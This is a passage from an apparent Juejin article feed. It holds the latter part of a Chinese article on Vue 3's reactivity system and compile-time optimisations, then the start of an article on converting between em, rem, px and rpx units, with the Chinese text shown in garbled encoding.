      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_setter</span>(newVal)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'Write operation failed: computed value is readonly'</span>)
    }
  }
}
</code></pre>
<h2 data-id="heading-11">ğŸ”§Â <strong>ç¼–è¯‘æ—¶ä¼˜åŒ–</strong></h2>
<h3 data-id="heading-12">8.Â <strong>Patch Flags ä¼˜åŒ–</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ¨¡æ¿ç¼–è¯‘ä¼˜åŒ–ç¤ºä¾‹</span>
<span class="hljs-comment">// ç¼–è¯‘å‰æ¨¡æ¿</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>é™æ€å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ dynamic }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"className"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="hljs-comment">// ç¼–è¯‘åä»£ç </span>
<span class="hljs-keyword">import</span> { createElementVNode <span class="hljs-keyword">as</span> _createElementVNode } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>

<span class="hljs-keyword">const</span> _hoisted_1 = <span class="hljs-comment">/*#__PURE__*/</span><span class="hljs-title function_">_createElementVNode</span>(
  <span class="hljs-string">"span"</span>, 
  <span class="hljs-literal">null</span>, 
  <span class="hljs-string">"é™æ€å†…å®¹"</span>,
  -<span class="hljs-number">1</span> <span class="hljs-comment">/* HOISTED */</span>
)

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">_ctx, _cache</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">_createElementVNode</span>(
    <span class="hljs-string">"div"</span>, 
    <span class="hljs-literal">null</span>, [
      _hoisted_1,  <span class="hljs-comment">// é™æ€èŠ‚ç‚¹æå‡</span>
      <span class="hljs-title function_">_createElementVNode</span>(
        <span class="hljs-string">"span"</span>, 
        <span class="hljs-literal">null</span>, 
        <span class="hljs-title function_">_toDisplayString</span>(_ctx.<span class="hljs-property">dynamic</span>),
        <span class="hljs-number">1</span> <span class="hljs-comment">/* TEXT */</span>
      ),
      <span class="hljs-title function_">_createElementVNode</span>(
        <span class="hljs-string">"div"</span>, 
        {
          <span class="hljs-attr">class</span>: <span class="hljs-title function_">normalizeClass</span>(_ctx.<span class="hljs-property">className</span>)
        },
        <span class="hljs-literal">null</span>,
        <span class="hljs-number">2</span> <span class="hljs-comment">/* CLASS */</span>
      )
    ],
    <span class="hljs-number">0</span> <span class="hljs-comment">/* æ— æ ‡å¿— */</span>
  )
}

<span class="hljs-comment">// Patch Flags ç±»å‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">PatchFlags</span> = {
  <span class="hljs-attr">TEXT</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment">// åŠ¨æ€æ–‡æœ¬</span>
  <span class="hljs-attr">CLASS</span>: <span class="hljs-number">2</span>,       <span class="hljs-comment">// åŠ¨æ€ class</span>
  <span class="hljs-attr">STYLE</span>: <span class="hljs-number">4</span>,       <span class="hljs-comment">// åŠ¨æ€ style</span>
  <span class="hljs-attr">PROPS</span>: <span class="hljs-number">8</span>,       <span class="hljs-comment">// åŠ¨æ€ props</span>
  <span class="hljs-attr">FULL_PROPS</span>: <span class="hljs-number">16</span>, <span class="hljs-comment">// åŠ¨æ€ keyï¼Œéœ€è¦å…¨é‡ diff</span>
  <span class="hljs-attr">HYDRATE_EVENTS</span>: <span class="hljs-number">32</span>,
  <span class="hljs-attr">STABLE_FRAGMENT</span>: <span class="hljs-number">64</span>,
  <span class="hljs-attr">KEYED_FRAGMENT</span>: <span class="hljs-number">128</span>,
  <span class="hljs-attr">UNKEYED_FRAGMENT</span>: <span class="hljs-number">256</span>,
  <span class="hljs-attr">NEED_PATCH</span>: <span class="hljs-number">512</span>,
  <span class="hljs-attr">DYNAMIC_SLOTS</span>: <span class="hljs-number">1024</span>,
  <span class="hljs-attr">HOISTED</span>: -<span class="hljs-number">1</span>,    <span class="hljs-comment">// é™æ€æå‡</span>
  <span class="hljs-attr">BAIL</span>: -<span class="hljs-number">2</span>        <span class="hljs-comment">// ç‰¹æ®Šæƒ…å†µ</span>
}
</code></pre>
<h3 data-id="heading-13">9.Â <strong>Tree Flatteningï¼ˆæ ‘ç»“æ„æ‰“å¹³ï¼‰</strong></h3>
<pre><code class="hljs language-javascri" lang="javascri">// ä¼˜åŒ–å‰çš„ VNode ç»“æ„
{
  type: 'div',
  children: [
    { type: 'p', children: 'é™æ€å†…å®¹' },
    { type: 'span', children: [/* åŠ¨æ€å†…å®¹ */] },
    { type: 'div', children: [/* æ›´å¤šåµŒå¥— */] }
  ]
}

// ä¼˜åŒ–åçš„ VNode ç»“æ„
{
  type: 'div',
  children: [
    { type: 'p', children: 'é™æ€å†…å®¹' },
    // åŠ¨æ€èŠ‚ç‚¹è¢«æå–åˆ°å•ç‹¬çš„æ•°ç»„ä¸­
  ],
  // åŠ¨æ€å­èŠ‚ç‚¹è¢«æ”¶é›†åˆ°è¿™é‡Œ
  dynamicChildren: [
    { type: 'span', patchFlag: 1 },
    { type: 'div', patchFlag: 2 }
  ]
}

// æ›´æ–°æ—¶åª diff dynamicChildrenï¼Œè·³è¿‡é™æ€èŠ‚ç‚¹
</code></pre>
<h2 data-id="heading-14">ğŸ“ŠÂ <strong>å“åº”å¼æ€§èƒ½ä¼˜åŒ–</strong></h2>
<h3 data-id="heading-15">10.Â <strong>ä¾èµ–æ”¶é›†ä¼˜åŒ–</strong></h3>
<pre><code class="hljs language-javascr" lang="javascr">// 1. æƒ°æ€§ä¾èµ–æ”¶é›†
let shouldTrack = true

function pauseTracking() {
  shouldTrack = false
}

function enableTracking() {
  shouldTrack = true
}

function track(target, key) {
  if (!shouldTrack || !activeEffect) return
  // ... åŸæœ‰çš„ track é€»è¾‘
}

// 2. æ‰¹é‡æ›´æ–°
let isFlushing = false
let queue = []

function queueJob(job) {
  if (!queue.includes(job)) {
    queue.push(job)
  }
  
  // ä¸‹ä¸€ä¸ª tick æ‰§è¡Œæ‰€æœ‰æ›´æ–°
  if (!isFlushing) {
    isFlushing = true
    Promise.resolve().then(() =&gt; {
      try {
        queue.forEach(job =&gt; job())
      } finally {
        queue.length = 0
        isFlushing = false
      }
    })
  }
}

// 3. å“åº”å¼å±‚çº§çš„ä¼˜åŒ–
const RAW = '__v_raw'  // åŸå§‹å¯¹è±¡æ ‡è®°

function toRaw(observed) {
  const raw = observed &amp;&amp; observed[RAW]
  return raw ? toRaw(raw) : observed
}

// é¿å…æ·±å±‚ä»£ç†çš„é‡å¤åˆ›å»º
const proxyMap = new WeakMap()

function createReactiveObject(target) {
  // æ£€æŸ¥æ˜¯å¦å·²ç»æœ‰ä»£ç†
  const existingProxy = proxyMap.get(target)
  if (existingProxy) {
    return existingProxy
  }
  
  const proxy = new Proxy(target, handlers)
  proxyMap.set(target, proxy)
  return proxy
}
</code></pre>
<h2 data-id="heading-16">ğŸ”„Â <strong>å“åº”å¼ç³»ç»Ÿçš„è°ƒåº¦æœºåˆ¶</strong></h2>
<h3 data-id="heading-17">11.Â <strong>æ›´æ–°é˜Ÿåˆ—ä¸è°ƒåº¦å™¨</strong></h3>
<pre><code class="hljs language-javascri" lang="javascri">// å“åº”å¼ä»»åŠ¡è°ƒåº¦å™¨
const queue = []
let isFlushing = false
const resolvedPromise = Promise.resolve()

function queueFlush() {
  if (!isFlushing &amp;&amp; !queue.length) {
    isFlushing = true
    resolvedPromise.then(flushJobs)
  }
}

function flushJobs() {
  try {
    // å…ˆæ‰§è¡Œæ‰€æœ‰å‰ç½®ä»»åŠ¡
    for (let i = 0; i &lt; queue.length; i++) {
      const job = queue[i]
      if (job &amp;&amp; job.active !== false) {
        if (job.pre) {
          job()
        }
      }
    }
    
    // æ‰§è¡Œç»„ä»¶æ›´æ–°
    for (let i = 0; i &lt; queue.length; i++) {
      const job = queue[i]
      if (job &amp;&amp; job.active !== false) {
        if (!job.pre) {
          job()
        }
      }
    }
  } finally {
    // æ¸…ç©ºé˜Ÿåˆ—
    queue.length = 0
    isFlushing = false
    
    // æ‰§è¡Œåç½®ä»»åŠ¡
    // flushPostFlushCbs()
  }
}

// watch çš„è°ƒåº¦å®ç°
function watch(source, cb, options = {}) {
  const { flush = 'sync' } = options
  
  let scheduler
  if (flush === 'sync') {
    scheduler = job =&gt; job()  // åŒæ­¥æ‰§è¡Œ
  } else if (flush === 'pre') {
    scheduler = job =&gt; queueJob(job)  // ç»„ä»¶æ›´æ–°å‰
  } else { // 'post'
    scheduler = job =&gt; queuePostFlushCb(job)  // ç»„ä»¶æ›´æ–°å
  }
  
  const effect = new ReactiveEffect(getter, scheduler)
  // ...
}
</code></pre>
<h2 data-id="heading-18">ğŸ¯Â <strong>å“åº”å¼ç³»ç»Ÿçš„è¾¹ç•Œæƒ…å†µ</strong></h2>
<h3 data-id="heading-19">12.Â <strong>å¾ªç¯å¼•ç”¨å¤„ç†</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨ WeakMap é¿å…å¾ªç¯å¼•ç”¨</span>
<span class="hljs-keyword">const</span> reactiveMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>()

<span class="hljs-keyword">function</span> <span class="hljs-title function_">reactive</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-comment">// å¦‚æœå·²ç»ä»£ç†è¿‡ï¼Œç›´æ¥è¿”å›</span>
  <span class="hljs-keyword">const</span> existing = reactiveMap.<span class="hljs-title function_">get</span>(obj)
  <span class="hljs-keyword">if</span> (existing) <span class="hljs-keyword">return</span> existing
  
  <span class="hljs-comment">// å¦‚æœå¯¹è±¡æœ‰å¾ªç¯å¼•ç”¨æ ‡è®°ï¼Œè·³è¿‡</span>
  <span class="hljs-keyword">if</span> (obj &amp;&amp; obj.<span class="hljs-property">__v_skip</span>) {
    <span class="hljs-keyword">return</span> obj
  }
  
  <span class="hljs-keyword">const</span> proxy = <span class="hljs-title function_">createReactiveObject</span>(obj)
  reactiveMap.<span class="hljs-title function_">set</span>(obj, proxy)
  <span class="hljs-keyword">return</span> proxy
}

<span class="hljs-comment">// æ ‡è®°è·³è¿‡å“åº”å¼çš„å¯¹è±¡</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">markRaw</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(value, <span class="hljs-string">'__v_skip'</span>, {
    <span class="hljs-attr">value</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>
  })
  <span class="hljs-keyword">return</span> value
}
</code></pre>
<h3 data-id="heading-20">13.Â <strong>å¤§å¯¹è±¡çš„æ€§èƒ½ä¼˜åŒ–</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æµ…å±‚å“åº”å¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">shallowReactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createReactiveObject</span>(target, <span class="hljs-literal">true</span>)
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createReactiveObject</span>(<span class="hljs-params">target, shallow = <span class="hljs-literal">false</span></span>) {
  <span class="hljs-keyword">const</span> handlers = shallow ? shallowHandlers : baseHandlers
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-comment">// æµ…å±‚ handlers</span>
<span class="hljs-keyword">const</span> shallowHandlers = {
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
    <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver)
    <span class="hljs-title function_">track</span>(target, key)
    
    <span class="hljs-comment">// å…³é”®åŒºåˆ«ï¼šä¸é€’å½’å¤„ç†åµŒå¥—å¯¹è±¡</span>
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment">// ç›´æ¥è¿”å›ï¼Œä¸å†åŒ…è£…</span>
  },
  <span class="hljs-comment">// ... å…¶ä»– handlers</span>
}

<span class="hljs-comment">// æƒ°æ€§å“åº”å¼ï¼šåªåœ¨å®é™…è®¿é—®æ—¶è¿›è¡Œä»£ç†</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">lazyReactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">let</span> proxyCache = <span class="hljs-literal">null</span>
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
      <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'__v_raw'</span>) <span class="hljs-keyword">return</span> target
      
      <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰åˆ›å»ºçœŸæ­£çš„å“åº”å¼ä»£ç†</span>
      <span class="hljs-keyword">if</span> (!proxyCache) {
        proxyCache = <span class="hljs-title function_">reactive</span>(target)
      }
      
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(proxyCache, key, receiver)
    },
    <span class="hljs-comment">// ... å…¶ä»–æ“ä½œ</span>
  })
}
</code></pre>
<h2 data-id="heading-21">ğŸ“ˆÂ <strong>å“åº”å¼ç³»ç»Ÿçš„ç›‘æ§ä¸è°ƒè¯•</strong></h2>
<h3 data-id="heading-22">14.Â <strong>å¼€å‘å·¥å…·é›†æˆ</strong></h3>
<pre><code class="hljs language-javascri" lang="javascri">// å“åº”å¼è°ƒè¯•ä¿¡æ¯
function setupReactivityDebug() {
  // 1. è·Ÿè¸ªä¾èµ–å…³ç³»
  const dependencyGraph = new Map()
  
  // 2. æ€§èƒ½ç›‘æ§
  const performance = {
    trackTime: 0,
    triggerTime: 0,
    effectCount: 0
  }
  
  // 3. å†…å­˜æ³„æ¼æ£€æµ‹
  const effectRegistry = new WeakSet()
  
  return {
    // æš´éœ²ç»™ Vue DevTools çš„æ¥å£
    inspect(target) {
      const depsMap = targetMap.get(target)
      return {
        deps: depsMap ? Array.from(depsMap.entries()) : [],
        rawValue: toRaw(target),
        isReactive: isReactive(target)
      }
    },
    
    // æ€§èƒ½åˆ†æ
    getPerformance() {
      return { ...performance }
    },
    
    // æ¸…ç†æ‰€æœ‰ effect
    disposeAll() {
      // æ¸…ç†é€»è¾‘
    }
  }
}

// Vue DevTools ä¸­çš„å“åº”å¼é¢æ¿å¯ä»¥çœ‹åˆ°ï¼š
// 1. å“åº”å¼å¯¹è±¡çš„ä¾èµ–å›¾
// 2. æ¯ä¸ªå±æ€§çš„ä¾èµ–åˆ—è¡¨
// 3. Effect çš„æ‰§è¡Œå†å²
// 4. æ€§èƒ½åˆ†ææ•°æ®
</code></pre>
<h2 data-id="heading-23">ğŸ“Â <strong>æ€»ç»“ï¼šVue å“åº”å¼ç³»ç»Ÿçš„æ¼”è¿›</strong></h2>
<h3 data-id="heading-24"><strong>Vue 2 åˆ° Vue 3 çš„å…³é”®æ”¹è¿›</strong>ï¼š</h3>
<ol>
<li><strong>åº•å±‚å®ç°</strong>ï¼š<code>Object.defineProperty</code>Â â†’Â <code>Proxy</code></li>
<li><strong>æ€§èƒ½</strong>ï¼šé€’å½’åˆå§‹åŒ– â†’ æƒ°æ€§ä»£ç†</li>
<li><strong>åŠŸèƒ½</strong>ï¼šä¸æ”¯æŒæ–°å¢å±æ€§ â†’ å®Œå…¨æ”¯æŒ</li>
<li><strong>ç±»å‹æ”¯æŒ</strong>ï¼šæœ‰é™çš„ç±»å‹æ¨æ–­ â†’ å®Œæ•´çš„ TypeScript æ”¯æŒ</li>
<li><strong>é›†åˆç±»å‹</strong>ï¼šä¸æ”¯æŒ Map/Set â†’ å®Œæ•´æ”¯æŒ</li>
</ol>
<h3 data-id="heading-25"><strong>æ ¸å¿ƒåˆ›æ–°ç‚¹</strong>ï¼š</h3>
<ul>
<li><strong>ç¼–è¯‘æ—¶ä¼˜åŒ–</strong>ï¼šPatch Flagsã€Tree Flattening</li>
<li><strong>ä¾èµ–æ”¶é›†ç²’åº¦</strong>ï¼šç»„ä»¶çº§ â†’ å±æ€§çº§</li>
<li><strong>æ›´æ–°è°ƒåº¦</strong>ï¼šåŒæ­¥æ›´æ–° â†’ å¼‚æ­¥æ‰¹é‡æ›´æ–°</li>
<li><strong>å†…å­˜ç®¡ç†</strong>ï¼šWeakMap è‡ªåŠ¨åƒåœ¾å›æ”¶</li>
</ul>
<h3 data-id="heading-26"><strong>è®¾è®¡å“²å­¦</strong>ï¼š</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue å“åº”å¼ç³»ç»Ÿçš„è®¾è®¡ç›®æ ‡ï¼š</span>
<span class="hljs-number">1.</span> é€æ˜æ€§ï¼šå¼€å‘è€…æ— éœ€æ‰‹åŠ¨ç®¡ç†ä¾èµ–
<span class="hljs-number">2.</span> é«˜æ•ˆæ€§ï¼šæœ€å°åŒ–çš„æ›´æ–°èŒƒå›´
<span class="hljs-number">3.</span> ä¸€è‡´æ€§ï¼šåŒæ­¥çš„ç¼–ç¨‹æ¨¡å‹ï¼Œå¼‚æ­¥çš„æ›´æ–°æ‰§è¡Œ
<span class="hljs-number">4.</span> æ¸è¿›æ€§ï¼šä»ç®€å•åˆ°å¤æ‚çš„å¹³æ»‘è¿‡æ¸¡
<span class="hljs-number">5.</span> å¯è°ƒè¯•æ€§ï¼šå®Œæ•´çš„å¼€å‘å·¥å…·æ”¯æŒ

<span class="hljs-comment">// è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Vue çš„å“åº”å¼ç³»ç»Ÿæ—¢å¼ºå¤§åˆæ˜“ç”¨</span>
</code></pre>
<p>Vue çš„å“åº”å¼ç³»ç»Ÿæ˜¯å…¶æ¡†æ¶çš„æ ¸å¿ƒï¼Œå®ƒå·§å¦™åœ°å°†<strong>å£°æ˜å¼ç¼–ç¨‹</strong>ä¸<strong>é«˜æ•ˆçš„æ›´æ–°æœºåˆ¶</strong>ç»“åˆèµ·æ¥ï¼Œä¸ºå¼€å‘è€…æä¾›äº†æä½³çš„å¼€å‘ä½“éªŒï¼ŒåŒæ—¶ä¿è¯äº†ä¼˜ç§€çš„è¿è¡Œæ—¶æ€§èƒ½ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[em,rem,px,rpxå•ä½æ¢ç®—ï¼Œä½ å¼„æ‡‚äº†å—ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592759140038000681</link>    <guid>https://juejin.cn/post/7592759140038000681</guid>    <pubDate>2026-01-08T09:01:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759140038000681" data-draft-id="7592555965793124358" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="em,rem,px,rpxå•ä½æ¢ç®—ï¼Œä½ å¼„æ‡‚äº†å—ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T09:01:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ€ªå¯çˆ±çš„åœ°çƒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/4387527339288932"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            em,rem,px,rpxå•ä½æ¢ç®—ï¼Œä½ å¼„æ‡‚äº†å—ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4387527339288932/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ€ªå¯çˆ±çš„åœ°çƒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:01:33.000Z" title="Thu Jan 08 2026 09:01:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€åœ¨ç½‘é¡µä¸Šé¢çš„æ¢ç®—</h2>
<h4 data-id="heading-1">emä¸remä¸pxçš„æ¢ç®—</h4>
<h3 data-id="heading-2">emå…¬å¼</h3>
<pre><code class="hljs language-js" lang="js">em Ã— çˆ¶å…ƒç´ å­—ä½“å¤§å° = px
</code></pre>
<pre><code class="hljs language-js" lang="js">&lt;!-- çˆ¶å…ƒç´ ï¼šå­—ä½“ 20px --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"font-size: 20px"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- å­å…ƒç´ ï¼špadding 1.25em --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"padding: 1.25em"</span>&gt;</span>
    å†…å®¹
  <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
</code></pre>
<p>è®¡ç®—ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">1.</span>25em Ã— 20px = 25px
æ‰€ä»¥ padding = 25px
</code></pre>
<h6 data-id="heading-3">åµŒå¥—æƒ…å†µï¼ˆå¤šå±‚çˆ¶å…ƒç´ ï¼‰</h6>
<pre><code class="hljs language-js" lang="js">&lt;div style=<span class="hljs-string">"font-size: 20px"</span>&gt;        &lt;!-- æœ€å¤–å±‚çˆ¶å…ƒç´  --&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"font-size: 18px"</span>&gt;</span>      <span class="hljs-comment">&lt;!-- ä¸­é—´çˆ¶å…ƒç´  --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"padding: 1.25em"</span>&gt;</span>      <span class="hljs-comment">&lt;!-- å­å…ƒç´  --&gt;</span>
      å†…å®¹
    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/div&gt;
</code></pre>
<ul>
<li>å­å…ƒç´ çš„Â 1.25emÂ ç›¸å¯¹äºç›´æ¥çˆ¶å…ƒç´ ï¼ˆä¸­é—´ divï¼‰</li>
<li>1.25em Ã— 18px = 22.5px</li>
</ul>
<h3 data-id="heading-4">remåŸºç¡€å…¬å¼</h3>
<pre><code class="hljs language-js" lang="js">remå€¼*æ ¹å…ƒç´ å­—ä½“å¤§å°=pxå€¼
</code></pre>
<h6 data-id="heading-5">é»˜è®¤æƒ…å†µ</h6>
